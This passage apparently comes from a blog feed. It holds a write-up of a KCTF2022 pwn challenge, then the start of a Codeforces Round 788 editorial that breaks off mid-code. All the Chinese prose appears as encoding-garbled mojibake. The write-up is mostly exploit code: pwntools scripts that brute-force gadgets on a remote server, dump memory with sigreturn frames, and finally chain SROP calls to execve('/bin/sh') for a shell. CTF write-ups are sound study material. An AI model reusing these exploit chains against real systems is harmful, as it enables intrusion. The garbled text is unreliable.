<code>gadget</code> ä¸º <code>ret</code>ï¼Œé‚£ä¹ˆåˆ™ä¼šç»§ç»­æµç¨‹ï¼Œå¦‚æœ <code>gadget</code> ç±»ä¼¼äº <code>pop xxx ret</code> çš„è¯åˆ™ä¼šé‡æ–°æ‰§è¡Œ <code>main</code> å‡½æ•°ã€‚ç»“æœ <code>ret</code> æ‰¾åˆ°äº†å¾ˆå¤šï¼Œå…¶å®ƒçš„ <code>gadget</code> æ„£æ˜¯æ²¡æ‰¾åˆ°ä¸€ä¸ªï¼Œäºæ˜¯å†³å®šå¾€åé¢å†åŠ ä¸€ä¸ª <code>p64(main)</code>ï¼Œç»“æœå±…ç„¶æ‰¾åˆ°äº†ä¸ƒä¸ªåœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a0x4000f5 pop xxx *2;ret</span><br><span class="line">0x4000fa pop xxx *2;ret</span><br><span class="line">0x4000fb pop xxx *2;ret</span><br><span class="line">0x4000fd pop xxx *2;ret</span><br><span class="line">0x4000fe pop xxx *2;ret</span><br><span class="line">0x400100 pop xxx *2;ret</span><br><span class="line">0x400101 ret</span><br><span class="line">0x400102 pop xxx *2 ; ret</span><br><span class="line">0x400106 ret</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘å°è¯•å–å¯»æ‰¾å®ƒçš„ <code>IO</code> å‡½æ•°å»è¾“å‡ºå®ƒçš„ <code>got</code> è¡¨ï¼Œä½†æ˜¯æµ‹äº†å¾ˆå¤šåœ°å€éƒ½æ²¡æœ‰å‘ç°æœ‰è¾“å‡º <code>\n</code> å­—èŠ‚ï¼Œè¿™é‡Œä¹Ÿæ’é™¤å®ƒç”¨ <code>puts</code> å‡½æ•°è¾“å‡ºçš„å¯èƒ½ï¼Œä½†æ˜¯å®ƒå¯èƒ½ä¹Ÿç”¨äº† <code>printf</code> æˆ–è€…æ˜¯ <code>write</code> å‡½æ•°ä¹‹ç±»çš„ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å¾€ <code>printf</code> å»æƒ³è€Œæ²¡æœ‰å¾€ <code>write</code> å»æƒ³ã€‚ç„¶åæˆ‘å°±æ‹¿é‚£äº› <code>gadget</code> è¯•ç€ä¼ å‚çœ‹çœ‹ï¼Œç»“æœä¸å‡ºæ„å¤–éƒ½å¤±è´¥äº†ï¼Œæ— ä»»ä½•å›æ˜¾ã€‚</p><p>è¿™é‡Œæˆ‘å›°æ‰°äº†å¾ˆä¹…ï¼Œåæ¥æˆ‘ä»¬é˜Ÿçš„ <code>ThTsOd</code> å¸ˆå‚…ç»™äº†æˆ‘ä¸€ä¸ªå¾ˆé‡è¦çš„æ€è·¯ï¼Œé‚£å°±æ˜¯</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/3.png" alt="3"></p><p>å†æ¥çœ‹çœ‹ç²¾è‡´å¾—åˆ†çš„è§„åˆ™ï¼š</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/4.png" alt="4"></p><p>ç›´æ¥æ‹‰æ»¡äº†é‚£å°±å¾ˆèƒ½è¯´æ˜é—®é¢˜äº†ï¼Œè‚¯å®šæ˜¯ç”šè‡³æ²¡æœ‰ <code>plt</code> æˆ–è€… <code>got</code> è¡¨çš„é‚£ç§æ–‡ä»¶ï¼Œç›´æ¥ç”¨çš„ <code>syscall</code> æ‰èƒ½æœ‰è¿™ä¹ˆå°çš„é•¿åº¦ã€‚</p><p>è¿™é‡Œå€Ÿç”¨ä»¥ä¸‹ <code>ThTsOd</code> å¸ˆå‚…çš„è„šæœ¬ï¼Œå¸®æˆ‘ä»¬ç¡®å®šäº†ä¸€äº› <code>syscall</code> çš„ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;warn&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x400120</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10005</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(pop_rdi)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(pop_rsi_2)+p64(<span class="number">0x400000</span>)*<span class="number">2</span>+p64(<span class="number">0x4000ce</span>)</span><br><span class="line">            <span class="comment">#payload=b&#x27;a&#x27;*0x10+</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">            ss=(p.recvall(timeout=<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),k,ss)</span><br><span class="line">            <span class="comment">#if ss==s:</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹ <code>rax</code> çš„å€¼æˆåŠŸè°ƒç”¨<code>sys_read</code> <code>dump</code> å‡ºäº†æ ˆä¸Šé¢çš„å†…å­˜ã€‚</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/5.png" alt="5"></p><p>ç”±æ­¤æˆ‘ä»¬ç¡®å®šäº† <code>syscall ret</code> çš„ <code>gadget</code> åœ¨ <code>0x4000ec</code> çš„åœ°æ–¹ã€‚ä½†æ˜¯è¿˜éœ€è¦æœ‰ä¸€ä¸ªå›ºå®šèƒ½ <code>read</code> çš„ <code>gadget</code> æ‰è¡Œï¼Œå› ä¸ºåªæœ‰è¿™æ ·æˆ‘ä»¬æ‰èƒ½æ§åˆ¶ <code>rax</code> å¯„å­˜å™¨çš„å€¼ï¼Œæ¥é€‰æ‹©æˆ‘ä»¬éœ€è¦çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿæ‰¾åˆ°äº†ï¼Œåœ¨<code>0x4000f3</code>ï¼Œå¹¶ä¸”å‘ç°éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°æ‰èƒ½æŠŠ <code>rop</code> é“¾æ‹¼æ¥ä¸Šå»ï¼Œæ„Ÿè§‰è¿™é‡Œä¸¤ä¸ªå‚æ•°åº”è¯¥æ˜¯ <code>add rsp,0x10</code> äº§ç”Ÿçš„ã€‚</p><p>é‚£ä¹Ÿä¸ç”¨ç®¡é‚£ä¹ˆå¤šäº†ï¼Œé€šè¿‡è¿™ä¸¤ä¸ª <code>gadget</code> æˆ‘ä»¬å°±èƒ½è¿›è¡Œä¸€æ¬¡æŒ‡å®šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸é€‰æ‹©ä½¿ç”¨ <code>write</code> è°ƒç”¨æ³„éœ²æ ˆçš„å†…å­˜ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠ <code>elf</code> çš„å†…å­˜ç»™ <code>dump</code> å‡ºæ¥å°±è¡Œï¼Œå› ä¸ºæ²¡æœ‰ <code>gadget</code> é‚£æˆ‘ä»¬ç›´æ¥ç”¨ <code>sigreturn</code> çš„æ–¹å¼æ§åˆ¶å¯„å­˜å™¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000f3</span>,<span class="number">0x4000f4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10088</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            rop=SigreturnFrame()</span><br><span class="line">            rop.rax=<span class="number">1</span></span><br><span class="line">            rop.rdi=<span class="number">1</span></span><br><span class="line">            rop.rip=syscall            </span><br><span class="line">            rop.rsp=<span class="number">0x400000</span></span><br><span class="line">            rop.rbp=<span class="number">0x400000</span></span><br><span class="line">            rop.rsi=<span class="number">0x400000</span></span><br><span class="line">            rop.rdx=<span class="number">0x400</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">            p.interactive()        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°±æˆåŠŸç”¨ <code>sigreturn</code> è°ƒç”¨äº† <code>sys_write(1,0x400000,0x400)</code> ï¼Œè‡³æ­¤ç»ˆäºä¸æ˜¯çå­è§†è§’äº†ï¼Œè¿™é‡Œå†æ˜¯ <code>ThTsOd</code> å¸ˆå‚…å¸®æˆ‘é‡å»ºäº† <code>ELF</code> æ–‡ä»¶ï¼Œ<code>IDA</code> ä¸€å¼€</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/7.png" alt="7"></p><p>å…¶å®ç°åœ¨ <code>IDA</code> å·²ç»ä¸é‡è¦äº†ï¼Œä¸»è¦è¿˜æ˜¯èƒ½æœ¬åœ°è°ƒè¯•å°±éå¸¸çˆ½ã€‚</p><p>ä½†æ˜¯è¿™é‡Œåˆå¡äº†ä¸€ä¸ªå…³ï¼Œé‚£å°±æ˜¯æ‰¾ä¸åˆ°ç¡®å®šåœ°å€å¯å†™çš„åœ°æ–¹å†™ä¸Š <code>/bin/sh</code>ã€‚è¿™é‡ŒåˆåŒå’å•æ˜¯ <code>ThTsOd</code> å¸ˆå‚…å‘æˆ‘æŒ‡æ˜äº† <code>0x600000</code> å¤„çš„å†…å­˜æ˜¯å¯è¯»å¯å†™çš„ã€‚</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/8.png" alt="8"></p><p>æ‰“å¼€ä¸€çœ‹æœç„¶æ˜¯è¿™æ ·ï¼Œè€Œä¸”ç»™çš„å†…å­˜è¿˜æŒºå¤šï¼Œé‚£å°±çˆ½äº†ï¼Œç›´æ¥å…ˆè°ƒç”¨ <code>sys_read</code> å†ä¸Šé¢å†™ä¸Š <code>/bin/sh</code> é¡ºä¾¿æ¥ä¸Š <code>rop</code> é“¾ï¼Œç„¶åå†ä¸€æ¬¡ <code>sigreturn</code> æ‰§è¡Œ <code>execve(&#39;/bin/sh&#39;,0,0)</code>  å»è·å¾— <code>shell</code>ã€‚</p><p>æœ€ç»ˆ <code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">s=p.recv()</span><br><span class="line">rop=SigreturnFrame()</span><br><span class="line">rop.rax=<span class="number">0</span></span><br><span class="line">rop.rdi=<span class="number">0</span></span><br><span class="line">rop.rip=syscall            </span><br><span class="line">rop.rsp=<span class="number">0x600020</span></span><br><span class="line">rop.rbp=<span class="number">0x600020</span></span><br><span class="line">rop.rsi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0x400</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(syscall)+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">rop.rax=<span class="number">59</span></span><br><span class="line">rop.rip=syscall</span><br><span class="line">rop.rdi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0</span></span><br><span class="line">rop.rsi=<span class="number">0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜åé¢ä¸éš¾ï¼Œä¸»è¦æ˜¯æƒ³åŠæ³• <code>dump</code> å†…å­˜é‡å»º <code>elf</code>ï¼Œç„¶åå°±æ˜¯ç­¾åˆ°çš„åšæ³•äº†ã€‚</p><p>é¢˜å¤–è¯ï¼šé‚£æˆ‘ä¸ç¦å¯¹é‚£ä¸ªç²¾è‡´åˆ†ä»…æœ‰ <code>87</code> åˆ†çš„ <code>pwn</code> é¢˜ç‘Ÿç‘Ÿå‘æŠ–äº†ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;KCTF2022æ˜¥å­£èµ› ç¬¬å…­é¢˜ writeup&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    <category term="brop" scheme="http://example.com/categories/ctf/pwn/brop/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 788(Div.2)é¢˜è§£</title>
    <link href="http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/"/>
    <id>http://example.com/2022/05/07/Codeforces%20Round%20788(Div.2)/</id>
    <published>2022-05-07T10:00:00.000Z</published>
    <updated>2022-05-07T10:48:20.040Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1670">Codeforces Round #788 (Div. 2)</a>é¢˜è§£ã€‚</p><p>å®å†µåœ¨<a href="https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Prof-Slim"><a href="#A-Prof-Slim" class="headerlink" title="A. Prof. Slim"></a>A. Prof. Slim</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>ç»™ä½ ä¸€ä¸ªåºåˆ—ï¼Œä¸€æ¬¡æ“ä½œä¼šä½¿åºåˆ—ä¸­çš„ä¸¤ä¸ªæ•°äº¤æ¢ç¬¦å·ä½†ä¸äº¤æ¢å¤§å°ï¼Œé—®èƒ½å¦åœ¨è‹¥å¹²æ¬¡æ“ä½œåä½¿å¾—åºåˆ—ä¸é€’å‡ã€‚å®¹æ˜“å¾—åˆ°è´Ÿæ•°çš„ä¸ªæ•°ä¸€å®šä¸å˜å¹¶ä¸”è´Ÿæ•°æ°¸è¿œå°äºæ­£æ•°ï¼Œå› æ­¤æœ€åçš„ç»“æœä¸€å®šæ˜¯è´Ÿæ•°å…¨åœ¨å‰é¢ï¼Œæ­£æ•°å…¨åœ¨åé¢ï¼Œå› ä¸ºä¸€ä¸ªä½ç½®çš„æ•°çš„ç»å¯¹å€¼ä¸€å®šä¸ä¼šæ”¹å˜ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°åœ¨ç»å¯¹å€¼ä¸­ï¼Œè´Ÿæ•°åŒºåŸŸä¸€å®šä¸é€’å¢ï¼Œæ­£æ•°åŒºåŸŸä¸€å®šä¸é€’å‡ã€‚å…ˆ <code>O(n)</code> ç»Ÿè®¡æ‰€æœ‰çš„è´Ÿæ•°çš„ä¸ªæ•°ï¼Œå†åˆ¤æ–­å°±okäº†ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn]; </span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> num_de=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            num_de++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> 